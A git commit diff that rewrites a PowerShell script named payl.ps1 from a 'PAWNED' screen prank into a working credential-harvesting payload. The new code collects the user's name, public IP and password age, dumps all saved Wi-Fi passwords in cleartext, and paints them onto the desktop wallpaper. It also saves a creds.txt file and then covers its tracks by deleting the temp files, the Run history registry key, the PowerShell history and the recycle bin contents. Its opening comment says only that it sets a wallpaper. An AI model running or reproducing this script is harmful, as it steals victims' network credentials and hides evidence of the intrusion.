c9d3c37418625d2e480549dbc8e4f0469660db59
lbrs <62109485+cdrclbrs@users.noreply.github.com>
2026-01-01 21:28:18 +0100

    Update payl.ps1

--- payl.ps1
+++ payl.ps1
@@ -1,43 +1,277 @@
-# On force la console en mode "Full Screen" ou grande taille pour l'ASCII
-$Host.UI.RawUI.WindowTitle = "Pawned"
-$Host.UI.RawUI.BackgroundColor = "Black"
-$Host.UI.RawUI.ForegroundColor = "Red"
-Clear-Host
+# This sets a wallpaper on your desktop
 
-$skull = @"
-     .... NO! ...                  ... MNO! ...
-   ..... MNO!! ...................... MNNOO! ...
- ..... MMNO! ......................... MNNOO!! .
-.... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
- ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
-    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
-   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
-   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...
-    ....... MMMMM..    OPPMMP    .,OMI! ....
-     ...... MMMM::   o.,OPMP,.o   ::I!! ...
-         .... NNM:::.,,OOPM!P,.::::!! ....
-          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
-         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
-           .. MMMMMNNOOMMNNIIIPPPOO!! ......
-          ...... MMMONNMMNNNIIIOO!..........
-       ....... MN MOMMMNNNIIIIIO! OO ..........
-    ......... MNO! IiiiiiiiiiiiI OOOO ...........
-  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
-   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
-   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
-      ...... OO! ................. ON! .......
-         ................................
-"@
+$hiddenMessage = "`n`nYou should `ntake care about your `nwindows sessions `n While leaving your computer"
+$ImageName = "dont-let-your-computer-alone"
 
-Write-Host $skull
 
-# Message centré
-Write-Host "`n      ######################################" -ForegroundColor Yellow
-Write-Host "      #             PAWNED!!!              #" -ForegroundColor White -BackgroundColor Red
-Write-Host "      ######################################`n" -ForegroundColor Yellow
+ function Get-Name {
 
-# Boucle infinie pour empêcher la fermeture automatique
-Write-Host "Appuyez sur une touche pour quitter (ou pas...)..."
-while($true) {
-    Start-Sleep -Seconds 1
+    try {
+
+    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
+
+    }
+
+
+    # Write Error is just for troubleshooting 
+    catch {Write-Error "No name was detected" 
+    return $env:UserName
+    -ErrorAction SilentlyContinue
+    }
+
+    return $fullName
+
 }
+
+$fn = Get-Name
+
+echo "Hey" $fn >> $Env:temp\foo.txt
+
+echo "`nYour computer is not very secure" >> $Env:temp\foo.txt
+
+#############################################################################################################################################
+
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current locaton
+
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
+
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+		
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
+
+}
+
+#############################################################################################################################################
+
+
+function Get-PubIP {
+
+    try {
+
+    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+
+    }
+ 
+ # If no Public IP is detected function will return $null to avoid sapi speak
+
+    # Write Error is just for troubleshooting 
+    catch {Write-Error "No Public IP was detected" 
+    return $null
+    -ErrorAction SilentlyContinue
+    }
+
+    return $computerPubIP
+}
+
+$PubIP = Get-PubIP
+if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }
+
+
+###########################################################################################################
+
+
+ function Get-Days_Set {
+
+    #-----VARIABLES-----#
+    # $pls (password last set) = the date/time their password was last changed 
+    # $days = the number of days since their password was last changed 
+
+    try {
+ 
+    $pls = net user $env:USERNAME | Select-String -Pattern "Password last" ; $pls = [string]$pls
+    $plsPOS = $pls.IndexOf("e")
+    $pls = $pls.Substring($plsPOS+2).Trim()
+    $pls = $pls -replace ".{3}$"
+    $time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
+    $DateArray =$time.Split(".")
+    $days = [int]$DateArray[0]
+    return $pls
+    
+    }
+ 
+ # If no password set date is detected funtion will return $null to cancel Sapi Speak
+
+    # Write Error is just for troubleshooting 
+    catch {Write-Error "Day password set not found" 
+    return $null
+    -ErrorAction SilentlyContinue
+    }
+}
+
+$pls = Get-Days_Set
+if ($pls) { echo "`nPassword Last Set: $pls" >> $Env:temp\foo.txt }
+
+
+###########################################################################################################
+
+
+# Get Network Interfaces
+$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
+
+# Get Wifi SSIDs and Passwords	
+$WLANProfileNames =@()
+
+#Get all the WLAN profile names
+$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
+
+#Trim the output to receive only the name
+Foreach($WLANProfileName in $Output){
+    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
+}
+$WLANProfileObjects =@()
+
+#Bind the WLAN profile names and also the password to a custom object
+Foreach($WLANProfileName in $WLANProfileNames){
+
+  
+    try{
+        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
+    }Catch{
+        $WLANProfilePassword = "The password is not stored in this profile"
+    }
+
+    $WLANProfileObject = New-Object PSCustomobject 
+    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
+    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
+    $WLANProfileObjects += $WLANProfileObject
+    Remove-Variable WLANProfileObject
+}
+    if (!$WLANProfileObjects) { Write-Host "variable is null" 
+    }else { 
+
+	echo "`nW-Lan profiles: ===============================" $WLANProfileObjects >> $Env:temp\foo.txt
+
+$content = [IO.File]::ReadAllText("$Env:temp\foo.txt")
+	}
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class PInvoke {
+    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
+    [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
+}
+"@
+$hdc = [PInvoke]::GetDC([IntPtr]::Zero)
+$w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
+$h = [PInvoke]::GetDeviceCaps($hdc, 117) # height
+
+
+Add-Type -AssemblyName System.Drawing
+
+$filename = "$env:tmp\foo.jpg" 
+$bmp = new-object System.Drawing.Bitmap $w,$h 
+$font = new-object System.Drawing.Font Consolas,18 
+$brushBg = [System.Drawing.Brushes]::White 
+$brushFg = [System.Drawing.Brushes]::Black 
+$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
+$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
+$graphics.DrawString($content,$font,$brushFg,500,100) 
+$graphics.Dispose() 
+$bmp.Save($filename) 
+
+echo $hiddenMessage > $Env:temp\foo.txt
+cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
+copy $Env:temp\foo.txt $Env:userprofile\creds.txt
+rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
+
+Function Set-WallPaper {
+ 
+
+ 
+param (
+    [parameter(Mandatory=$True)]
+    # Provide path to image
+    [string]$Image,
+    # Provide wallpaper style that you would like applied
+    [parameter(Mandatory=$False)]
+    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
+    [string]$Style
+)
+ 
+$WallpaperStyle = Switch ($Style) {
+  
+    "Fill" {"10"}
+    "Fit" {"6"}
+    "Stretch" {"2"}
+    "Tile" {"0"}
+    "Center" {"0"}
+    "Span" {"22"}
+  
+}
+ 
+If($Style -eq "Tile") {
+ 
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
+ 
+}
+Else {
+ 
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
+ 
+}
+ 
+Add-Type -TypeDefinition @" 
+using System; 
+using System.Runtime.InteropServices;
+  
+public class Params
+{ 
+    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
+    public static extern int SystemParametersInfo (Int32 uAction, 
+                                                   Int32 uParam, 
+                                                   String lpvParam, 
+                                                   Int32 fuWinIni);
+}
+"@ 
+  
+    $SPI_SETDESKWALLPAPER = 0x0014
+    $UpdateIniFile = 0x01
+    $SendChangeEvent = 0x02
+  
+    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
+  
+    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
+}
+
+
+function clean-exfil {
+
+try {
+
+	rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+	Remove-Item (Get-PSreadlineOption).HistorySavePath
+	Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+	}
+
+
+	catch {Write-Error "Can not do clean exfil" 
+	return $env:UserName
+	-ErrorAction SilentlyContinue
+	}
+}
+#----------------------------------------------------------------------------------------------------
+ 
+Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
+
+clean-exfil
+ 
